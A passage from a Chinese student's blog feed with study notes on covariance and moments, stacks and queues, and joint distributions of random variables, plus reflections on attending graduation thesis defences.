src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_hKk6egnLAf.png"></p><hr><h1 id="3-协方差及相关系数"><a href="#3-协方差及相关系数" class="headerlink" title="3 协方差及相关系数"></a>3 协方差及相关系数</h1><h2 id="3-1-协方差"><a href="#3-1-协方差" class="headerlink" title="3.1 协方差"></a>3.1 协方差</h2><p><strong>定义</strong>： 量$E{[X-E(X)][Y-E(Y)]}$称为随机变量$X$和$Y$的协方差，记为$Cov(X,Y)$，即$\operatorname{Cov}(X, Y)&#x3D;E{[X-E(X)][Y-E(Y)]}$。</p><p>计算协方差的一个简单公式：$\operatorname{Cov}(X, Y)&#x3D;E(X Y)-E(X) E(Y)$</p><h3 id="3-1-1-性质-xD"><a href="#3-1-1-性质-xD" class="headerlink" title="3.1.1 性质&#xD;"></a>3.1.1 性质&#xD;</h3><ol><li>$\operatorname{Cov}(X, C)&#x3D;0, C 为常数$</li><li>$\operatorname{Cov}(X, X)&#x3D;D(X)$</li><li>$\operatorname{Cov}(X, Y)&#x3D;\operatorname{Cov}(Y, X)$</li><li>$\operatorname{Cov}\left(X_{1}+X_{2}, Y\right)&#x3D;\operatorname{Cov}\left(X_{1}, Y\right)+\operatorname{Cov}\left(X_{2}, Y\right)$</li><li>$\operatorname{Cov}(a X, b Y)&#x3D;a b \operatorname{Cov}(X, Y) \quad a, b 是常数$</li><li>$\operatorname{Cov}(a X+b, Y)&#x3D;a \operatorname{Cov}(X, Y) \quad a, b 是常数$</li><li>$D(X \pm Y)&#x3D;D(X)+D(Y) \pm 2 \operatorname{Cov}(X, Y)$</li><li>若$X$与$Y$独立，则$\operatorname{Cov}(X, Y)&#x3D;0$</li></ol><h2 id="3-2-相关系数"><a href="#3-2-相关系数" class="headerlink" title="3.2 相关系数"></a>3.2 相关系数</h2><p><strong>定义</strong>：$设 D(X)&gt;0, D(Y)&gt;0，$称$\rho_{X Y}&#x3D;\frac{\operatorname{Cov}(X, Y)}{\sqrt{D(X) D(Y)}}$为随机变量$X$和$Y$的相关系数，$\rho_{X Y} 简记为 \rho$。</p><h3 id="3-2-1-性质"><a href="#3-2-1-性质" class="headerlink" title="3.2.1 性质"></a>3.2.1 性质</h3><ol><li>$|\rho| \leq 1$</li><li>$\left|\rho_{X Y}\right|&#x3D;1 \Leftrightarrow P{Y&#x3D;a+b X}&#x3D;1$</li><li>$X 和 Y 独立时, \rho&#x3D;0, 但其逆不真$</li><li>$若 \rho_{X Y}&#x3D;0 ，称 {X} 和 {Y} 不相关$</li></ol><p>定理：若随机变量X与Y的方差都存在，且均不为零；则下列四个命题等价。&#x20;</p><ol><li>$\rho_{X Y}&#x3D;0$</li><li>$\operatorname{cov}(X, Y)&#x3D;0$</li><li>$E(X Y)&#x3D;E(X) E(Y)$</li><li>$D(X \pm Y)&#x3D;D(X)+D(Y)$</li></ol><p>独立与不相关并不是等价的.，只有当(X,Y)服从二维正态分布时，则X与Y独立$\longleftrightarrow$X与Y不相关。</p><h2 id="3-3-相关性和独立性的联系"><a href="#3-3-相关性和独立性的联系" class="headerlink" title="3.3 相关性和独立性的联系"></a>3.3 相关性和独立性的联系</h2><p>相关性：线性相关的程度，不相关说明没有线性关系，但是并不代表没有其他函数关系</p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_wRjjCdCGlK.png"></p><hr><h1 id="4-矩、协方差矩阵"><a href="#4-矩、协方差矩阵" class="headerlink" title="4 矩、协方差矩阵"></a>4 矩、协方差矩阵</h1><h2 id="4-1-原点矩、中心矩"><a href="#4-1-原点矩、中心矩" class="headerlink" title="4.1 原点矩、中心矩"></a>4.1 原点矩、中心矩</h2><p><strong>定义</strong>：设X和Y是随机变量，若$E(X^{k}), k&#x3D;1,2, \cdots$存在，称它为X的k阶原点矩，简称k阶矩。</p><p>若$E{[X-E(X)]^{k}},  k&#x3D;2,3, \cdots$存在，称它为X的k阶中心距。</p><p>均值E(X)是X一阶原点矩，方差D(X)是X的二阶中心矩。</p><p>设 X 和 Y 是随机变量，若$E(X^{k} Y^{l}), \quad k, l&#x3D;1,2, \cdots$存在，称它为X 和 Y 的 k+l 阶混合（原点）矩.</p><p>若$E{[X-E(X)]^{k}[Y-E(Y)]^{l}}$存在，称它为X和Y的k+l阶混合中心矩。</p><blockquote><p>协方差Cov(X,Y)是X和Y的二阶混合中心矩。</p></blockquote><h2 id="4-2-协方差矩阵"><a href="#4-2-协方差矩阵" class="headerlink" title="4.2 协方差矩阵"></a>4.2 协方差矩阵</h2><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_do3mYNUyFR.png"></p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_TzyhRqzLBc.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕业生答辩旁听</title>
      <link href="/2024/06/12/%E6%AF%95%E4%B8%9A%E7%94%9F%E7%AD%94%E8%BE%A9%E6%97%81%E5%90%AC/"/>
      <url>/2024/06/12/%E6%AF%95%E4%B8%9A%E7%94%9F%E7%AD%94%E8%BE%A9%E6%97%81%E5%90%AC/</url>
      
        <content type="html"><![CDATA[<p>今天是毕业生答辩，虽然我还有其他的任务要做，但是我觉得抽出这个时间去旁听还是很重要的，因为我明年也要有这个经历，知己知彼，百战不殆。</p><h1 id="1-个人感受"><a href="#1-个人感受" class="headerlink" title="1 个人感受"></a>1 个人感受</h1><p>感觉好多人都是各种各样的管理系统，在听的过程中，感觉老师对这种管理系统都有些厌烦了。</p><p>在答辩的过程中，一定要展现出自己的自信，不要总是读PPT的文字，并且要多抬起头看老师，还有就是PPT中的内容不要放很多文字，要不然看着真的很难受。</p><p>除此之外，在做PPT的时候还是要做的美观一点吧，今天看的一些PPT真的一言难尽，一点想看下去的欲望都没有。所以说，有时间可以学一下做PPT，怎么做的美观大方，上了研究生肯定还有很多机会要用到PPT进行展示，所以这个技能学了不亏。</p><h2 id="1-1-发现的别人的问题"><a href="#1-1-发现的别人的问题" class="headerlink" title="1.1 发现的别人的问题"></a>1.1 发现的别人的问题</h2><h3 id="1-1-1-PPT"><a href="#1-1-1-PPT" class="headerlink" title="1.1.1 PPT"></a>1.1.1 PPT</h3><ol><li>字有点小，看不清</li><li>格式混乱，有些同学展示代码，但是代码是直接复制的文本，一点高亮都没有，感觉一点不想看</li><li>有人在PPT中整活，但是最好还是不要整了，因为看老师的效果不太好</li><li>不要一直低头读PPT，另外不要只顾自己的感受，要看一下老师的反应</li><li>PPT中的图表可以加一些颜色，要不然感觉有点难看和生硬</li><li>没有实现的或者实现了一部分的内容不要写在其中</li></ol><h3 id="1-1-2-答辩"><a href="#1-1-2-答辩" class="headerlink" title="1.1.2 答辩"></a>1.1.2 答辩</h3><ol><li>有一个同学的声音好小，答辩老师直接上来就很无语的说大点声</li><li>答辩的过程中要尊重老师，不要直接反驳老师，这样会让老师很尴尬</li><li>老师问什么问题就回答什么问题，千万不要驴唇不对马嘴，这样老师也会感觉你在躲避他的问题</li><li>答辩的时候要体现出自己的工作在什么地方，而不是一味地介绍前人已经做过的东西</li><li>对于自己写在论文中和PPT中的每一个字和每一个图都要十分清楚，因为这些就是老师提问的把手</li><li>答辩的时候千万不要说论文里有详细的介绍这种话，因为老师想要的是你的现场回答</li></ol><hr><h1 id="2-论文问题"><a href="#2-论文问题" class="headerlink" title="2 论文问题"></a>2 论文问题</h1><p>论文写作一定要规范，按照模板的要求，图和表的命名一定要规范，不要怕麻烦。</p><p>同时要按照论文写作的顺序，注意区分自己的工作和别人的工作，不要把自己的工作和前人的工作混为一谈，同时一定要把自己的工作内容和工作量介绍出来。</p><p>一定要有实验证明的部分，要不然做完了，老师都不知道你的工作的效果怎么样，到底有没有效果。</p><hr><h1 id="3-老师提问的问题"><a href="#3-老师提问的问题" class="headerlink" title="3 老师提问的问题"></a>3 老师提问的问题</h1><p>感觉都没有把自己的工作真真正正的介绍出来</p><p>提问的问题：</p><ol><li>分析一下PPT中的图表</li><li>云计算分配中对资源的定义是什么？</li></ol><p>等等，其他就没记录了，但是感觉大差不差，总之一定好好做。</p>]]></content>
      
      
      <categories>
          
          <category> 思考总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习思考 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 答辩 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第3章：栈和队列</title>
      <link href="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
      <url>/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="1-栈"><a href="#1-栈" class="headerlink" title="1 栈"></a>1 栈</h1><h2 id="1-1-栈的定义"><a href="#1-1-栈的定义" class="headerlink" title="1.1 栈的定义"></a>1.1 栈的定义</h2><p><strong>栈是只允许在一端进行插入或删除操作的线性表。</strong></p><ul><li>只允许在一端插入和删除的顺序表</li><li>允许插入和删除的一端称为栈顶 (top)</li><li>另一端称为栈底（bottom）</li><li>不含元素的空表称空栈</li><li>特点: 先进后出（FILO）或后进先出（LIFO）</li></ul><p><img src="https://img-blog.csdnimg.cn/20210218204524571.png#pic_center"></p><p><strong>栈的数学性质：</strong></p><p>n个不同元素进栈，出栈元素不同排列的个数是 $ \frac{1}{n + 1} C_{2n}^{n} $，上述公式被称为<strong>卡特兰（Catalan）数</strong>。</p><h2 id="1-2-栈的存储结构"><a href="#1-2-栈的存储结构" class="headerlink" title="1.2 栈的存储结构"></a>1.2 栈的存储结构</h2><h3 id="1-2-1-顺序存储"><a href="#1-2-1-顺序存储" class="headerlink" title="1.2.1 顺序存储"></a>1.2.1 顺序存储</h3><p>采用顺序存储的栈称为顺序栈，它利用一组地址连续的存储单元存放自栈底到栈顶的数据元素，同时附设一个指针（top）指示当前栈顶元素的位置。</p><p>若现在有一个栈，$StackSize&#x3D;5$，则栈的普通情况、空栈、满栈的情况分别如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20210218225339549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><h3 id="1-2-2-共享栈"><a href="#1-2-2-共享栈" class="headerlink" title="1.2.2 共享栈"></a>1.2.2 共享栈</h3><p>利用栈底位置相对不变的特征，可让两个顺序栈共享一个一维数组空间，将两个栈的栈底分别设置在共享空间的两端，两个栈顶向共享空间的中间延伸，如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/2021021909353762.png#pic_center"></p><p>两个栈的栈顶指针都指向栈顶元素，$ top_0 &#x3D; -1 $ 时 0 号栈为空，$ top_1 &#x3D; MaxSize $ 时 1 号栈为空；</p><p>仅当两个栈顶指针相邻 $ top_0 + 1 &#x3D; top_1 $ 时，判断为栈满。当 0 号栈进栈时 $ top_0 $ 先加 1 再赋值，1 号栈进栈时 $ top_1 $ 先减一再赋值出栈时则刚好相反。 </p><h3 id="1-2-3-链式存储结构"><a href="#1-2-3-链式存储结构" class="headerlink" title="1.2.3 链式存储结构"></a>1.2.3 链式存储结构</h3><p>采用链式存储的栈称为链栈，链栈的优点是便于多个栈共享存储空间和提高其效率，且不存在栈满上溢的情况。通常采用单链表实现，并规定所有操作都是在单链表的表头进行的。</p><p>这里规定链栈没有头节点，<code>Lhead</code>指向栈顶元素，如下图所示。</p><p><img src="https://img-blog.csdnimg.cn/2021021910502017.png#pic_center"></p><p>对于空栈来说，链表原定义是头指针指向空，那么链栈的空其实就是 $ top &#x3D; nullptr$ 的时候。</p><h3 id="1-2-4-性能分析"><a href="#1-2-4-性能分析" class="headerlink" title="1.2.4 性能分析"></a>1.2.4 性能分析</h3><p>链栈的进栈<code>push</code>和出栈<code>pop</code>操作都很简单，时间复杂度均为$O(1)$。</p><ul><li>对比一下顺序栈与链栈，它们在时间复杂度上是一样的，均为$O(1)$。</li><li>对于空间性能：<ul><li>顺序栈需要事先确定一个固定的长度，可能会存在内存空间浪费的问题，但它的优势是存取时定位很方便。</li><li>链栈则要求每个元素都有指针域，这同时也增加了一些内存开销，但对于栈的长度无限制。</li></ul></li><li>所以它们的区别和线性表中讨论的一样，如果栈的使用过程中元素变化不可预料，有时很小，有时非常大，那么最好是用链栈。</li><li>反之，如果它的变化在可控范围内，建议使用顺序栈会更好一些。</li></ul><h2 id="1-3-栈的应用"><a href="#1-3-栈的应用" class="headerlink" title="1.3 栈的应用"></a>1.3 栈的应用</h2><h3 id="1-3-1-递归"><a href="#1-3-1-递归" class="headerlink" title="1.3.1 递归"></a>1.3.1 递归</h3><p>递归是一种重要的程序设计方法。简单地说，若在一个函数、过程或数据结构的定义中又应用了它自身，则这个函数、过程或数据结构称为是递归定义的，简称<strong>递归</strong>。</p><p>它通常把一个大型的复杂问题层层转化为一个与原问题相似的规模较小的问题来求解。递归策略只需少量的代码就可以描述岀解题过程所需要的多次重复计算，大大减少了程序的代码量但在通常情况下，它的效率并不是太高。</p><h3 id="1-3-2-括号匹配"><a href="#1-3-2-括号匹配" class="headerlink" title="1.3.2 括号匹配"></a>1.3.2 括号匹配</h3><h3 id="1-3-3-表达式求值"><a href="#1-3-3-表达式求值" class="headerlink" title="1.3.3 表达式求值"></a>1.3.3 表达式求值</h3><h4 id="1-3-3-1-后缀表达式计算结果"><a href="#1-3-3-1-后缀表达式计算结果" class="headerlink" title="1.3.3.1 后缀表达式计算结果"></a>1.3.3.1 后缀表达式计算结果</h4><p>表达式求值是程序设计语言编译中一个最基本的问题，它的实现是栈应用的一个典型范例。</p><ul><li>中缀表达式不仅依赖运算符的优先级，而且还要处理括号。</li><li>后缀表达式的运算符在操作数后面，在后缀表达式中已考虑了运算符的优先级，没有括号，只有操作数和运算符。</li></ul><p>例如中缀表达式 $ A + B ∗ ( C − D ) − E &#x2F; F $ 所对应的后缀表达式为 $ A B C D − ∗ + E F &#x2F; $。</p><blockquote><p><strong>后缀表达式计算规则</strong>：从左到右遍历表达式的每个数字和符号，遇到是数字就进栈，遇到是符号，就将处于栈顶两个数字出栈，进项运算，运算结果进栈，一直到最终获得结果。</p></blockquote><p>后缀表达式 $ A B C D − ∗ + E F &#x2F; − $ 求值的过程需要12步，如下表所示：</p><p><img src="https://img-blog.csdnimg.cn/20210219121121556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><p>读者也可将后缀表达式与原运算式对应的表达式树（用来表示算术表达式的二元树）的后序遍历进行比较,可以发现它们有异曲同工之妙。</p><p>如下图则是 $ A + B ∗ ( C − D ) − E &#x2F; F $ 对应的表达式，它的后序遍历（左子树→右子树→根）即是表达式 $ A B C D − ∗ + E F &#x2F; $。</p><p><img src="https://img-blog.csdnimg.cn/20210219121509722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="1-3-3-2-中缀表达式转后缀表达式"><a href="#1-3-3-2-中缀表达式转后缀表达式" class="headerlink" title="1.3.3.2 中缀表达式转后缀表达式"></a>1.3.3.2 中缀表达式转后缀表达式</h4><p>把平时所用的标准四则运算表达式，即 $ a + b − a ∗ ( ( c + d ) &#x2F; e − f ) + g $ 叫做中缀表达式。</p><p>因为所有的运算符号都在两数字的中间，现在问题就是中缀到后缀的转化。</p><blockquote><p>规则：从左到右遍历中缀表达式的每个数字和符号。若是数字就输出，即成为后缀表达式的一部分；若是符号，则判断其与栈顶符号的优先级，是右括号或优先级低于栈顶符号（乘除优先加减）则栈顶元素依次出栈并输出，并将当前符号进栈，一直到最终输出后缀表达式为止。</p></blockquote><p>例：将中缀表达式 $ a + b − a ∗ ( ( c + d ) &#x2F; e − f ) + g $ 转化为相应的后缀表达式。</p><p>分析：需要根据操作符的优先级来进行栈的变化，我们用icp来表示当前扫描到的运算符ch的优先级，该运算符进栈后的优先级为isp，则运算符的优先级如下表所示，其中<code>isp</code>是栈内优先（in stack priority）数，<code>icp</code>是栈外优先（in coming priority）数。</p><p><img src="https://img-blog.csdnimg.cn/20210219123715333.png#pic_center"></p><p>我们在表达式后面加上符号‘#’，表示表达式结束。具体转换过程如下：</p><p><img src="https://img-blog.csdnimg.cn/20210219123919219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><p>即相应的后缀表达式为 $ a b + a c d + e &#x2F; f − ∗ − g + $。</p><hr><h1 id="2-队列"><a href="#2-队列" class="headerlink" title="2 队列"></a>2 队列</h1><h2 id="2-1-队列的基本概念"><a href="#2-1-队列的基本概念" class="headerlink" title="2.1 队列的基本概念"></a>2.1 队列的基本概念</h2><p>队列：一种先进先出的线形表。只允许在表一端插入，在另一端删除。</p><ul><li>队尾<code>rear</code>：插入端，线性表的表尾。</li><li>队头<code>front</code>：删除端，线性表的表头。</li></ul><p><img src="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/image.png"></p><p>队列的进队和出队：</p><p><img src="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/image-1.png"></p><h2 id="2-2-队列的顺序存储结构"><a href="#2-2-队列的顺序存储结构" class="headerlink" title="2.2 队列的顺序存储结构"></a>2.2 队列的顺序存储结构</h2><h3 id="2-2-1-队列的顺序存储"><a href="#2-2-1-队列的顺序存储" class="headerlink" title="2.2.1 队列的顺序存储"></a>2.2.1 队列的顺序存储</h3><p>顺序存储是指分配一块连续的存储单元存放队列中的元素，并附设两个指针：队头指针和队尾指针。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> data[MaxSize];</span><br><span class="line"><span class="type">int</span> front, rear;</span><br><span class="line">&#125;Queue;</span><br></pre></td></tr></table></figure><p>如下图所示，此时入队出现“上溢出”，但这种溢出不是真正的溢出，在data数组中依然存在可以存放元素的空位置，所以是一种假溢出。<br><img src="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/image-2.png"></p><h3 id="2-2-2-循环队列"><a href="#2-2-2-循环队列" class="headerlink" title="2.2.2 循环队列"></a>2.2.2 循环队列</h3><p>将顺序队列臆造成一个环状的空间，即把存储队列元素的表从逻辑上视为一个环，称为<strong>循环队列</strong>。若<code>rear+1==M</code>，则令<code>rear=0</code>;</p><ul><li>入队：<code>rear=(rear+1) % M; sq[rear]=x;</code></li><li>出队：<code>front=(front+1) % M; x = sq[front];</code></li></ul><p>为了区分队空还是队满，有三种处理方式：</p><ol><li>另外设一个标志以区别队空、队满</li><li>类型中增设表示元素个数的数据成员，这样队空的条件为$Q.size &#x3D; 0$，队满的条件为$Q.front &#x3D; Q.rear$</li><li>牺牲一个单元来区分队空和队满，入队时少用一个队列单元，这是一种较为普遍的做法。<ul><li>队空：$Q.front &#x3D; Q.rear$</li><li>队满：$(Q.rear + 1) % M &#x3D; Q.front$</li></ul></li></ol><p><img src="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/image-3.png"></p><h2 id="2-3-队列的链式存储结构"><a href="#2-3-队列的链式存储结构" class="headerlink" title="2.3 队列的链式存储结构"></a>2.3 队列的链式存储结构</h2><h3 id="2-3-1-队列的链式存储"><a href="#2-3-1-队列的链式存储" class="headerlink" title="2.3.1 队列的链式存储"></a>2.3.1 队列的链式存储</h3><p>队列的链式表示称为<strong>链队列</strong>，它实际上是一个同时带有队头指针和队尾指针的单链表。头指针指向队头结点，尾指针指向队尾结点，即单链表的最后一个结点。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 链队列结点定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LinkNode</span> *next;</span><br><span class="line">&#125;LinkNode;</span><br><span class="line"><span class="comment">// 链队列定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">LinkNode *front, *rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><ul><li>当$Q.front &#x3D;&#x3D; null$ 且 $Q.rear &#x3D;&#x3D; null$时，链队列为空。</li></ul><p><img src="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/image-5.png"></p><p>不带头节点的链队列在操作上往往比较麻烦，因此通常将链队列设计成一个带头节点的单链表。</p><p><img src="/2024/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/image-4.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第3章：多维随机变量及其分布</title>
      <link href="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/"/>
      <url>/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="1-二维随机变量"><a href="#1-二维随机变量" class="headerlink" title="1 二维随机变量"></a>1 二维随机变量</h1><h2 id="1-1-二维随机变量的分布函数"><a href="#1-1-二维随机变量的分布函数" class="headerlink" title="1.1 二维随机变量的分布函数"></a>1.1 二维随机变量的分布函数</h2><p>设 E 是一个随机试验， 它的样本空间是$S&#x3D;{e}$，设$X&#x3D;X(e), Y&#x3D;Y(e)$是定义在 S 上的随机变量，由它们构成的一个二维向量（X，Y）叫做<strong>二维随机变量</strong>或<strong>二维随机向量</strong>。</p><p><strong>定义1</strong>：设(X,Y)是二维随机变量,对于任意实数x和y，二元函数$F(x, y)&#x3D;P{(X \leq x) \cap(Y \leq y)}&#x3D;P{X \leq x, Y \leq y}$称为二维随机变量（X，Y）的<strong>分布函数</strong>，或者称为随机变量X和Y的<strong>联合分布函数</strong>。</p><h3 id="1-1-1-分布函数的函数值的几何解释"><a href="#1-1-1-分布函数的函数值的几何解释" class="headerlink" title="1.1.1 分布函数的函数值的几何解释"></a>1.1.1 分布函数的函数值的几何解释</h3><p>将二维随机变量（X，Y）看成是平面上随机点的坐标, 那么, 分布函数F(x, y)在点(x, y)处的函数值就是随机点（X，Y）落在下面左图所示的, 以点(x, y)为顶点而位于该点左下方的无穷矩形域内的概率。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_c5VzWDduU2.png"></p><p>$随机点 (X, Y) 落在矩形域 x_{1}&lt;x \leq x_{2}, y_{1}&lt;y \leq y_{2}$内的概率为：</p><p>$$<br>\begin{array}{c}P\left(x_{1}&lt;X \leq x_{2}, y_{1}&lt;Y \leq y_{2}\right) \ &#x3D;F\left(x_{2}, y_{2}\right)-F\left(x_{1}, y_{2}\right)-F\left(x_{2}, y_{1}\right)+F\left(x_{1}, y_{1}\right)\end{array}<br>$$</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_r4NOIB9XEk.png"></p><h3 id="1-1-2-分布函数F-x-y-的性质"><a href="#1-1-2-分布函数F-x-y-的性质" class="headerlink" title="1.1.2 分布函数F(x, y)的性质"></a>1.1.2 分布函数F(x, y)的性质</h3><p>（1） F(x, y) 是关于变量 x 和 y 的不减函数；</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image__cBOA2qapD.png"></p><p>（2）$0 \leq F(x, y) \leq 1$且</p><ul><li>对任意固定的$y \in R, F(-\infty, y)&#x3D;0$</li><li>对任意固定的$x \in R, F(x, -\infty)&#x3D;0$</li><li>$F(-\infty,-\infty)&#x3D;0, \quad F(+\infty,+\infty)&#x3D;1$</li></ul><p>（3）F(x, y)关于x, y是右连续的。</p><ul><li>$F(x, y)&#x3D;F(x+0, y)$</li><li>$F(x, y)&#x3D;F(x, y+0)$</li></ul><h2 id="1-2-二维离散型随机变量"><a href="#1-2-二维离散型随机变量" class="headerlink" title="1.2 二维离散型随机变量"></a>1.2 二维离散型随机变量</h2><p><strong>定义2</strong>：如果二维随机变量(X,Y)全部可能取到的不相同的值是有限对或可列无限多对，则称(X,Y)是离散型随机变量。</p><p><strong>定义3</strong>：二维离散型随机变量(X,Y)的分布律，或随机变量X和Y 的联合分布律定义为：</p><p>$$<br>P\left{X&#x3D;x_{i}, Y&#x3D;y_{j}\right}&#x3D;p_{i j}, i, j&#x3D;1,2, \ldots<br>$$</p><p>其中，$\left(x_{i}, y_{j}\right)$为(X,Y)可能取的值。</p><p>也可用表格来表示随机变量X和Y 的联合分布律. &#x20;</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_jllD3W7Tp2.png"></p><ul><li>$二维离散型随机变量 (X, Y) 的分布律具有性质$：</li></ul><p>$$<br>\left{\begin{array}{l}p_{i j} \geq 0, i, j&#x3D;1,2, \cdots \ \sum_{i} \sum_{j} p_{i j}&#x3D;1\end{array}\right.<br>$$</p><ul><li>$二维离散型随机变量 (X, Y) 的分布函数为:$</li></ul><p>$$<br>F(x, y)&#x3D;\sum_{x_{i} \leq x} \sum_{y_{j} \leq y} p_{i j}<br>$$</p><blockquote><p>例2   一个袋中有三个球, 依次标有数字 1, 2, 2,从中任取一个, 不放回袋中, 再任取一个, 设每次取球时, 各球被取到的可能性相等, 以 X, Y 分别记第一次和第二次取到的球上标有的数字,求 ( X, Y ) 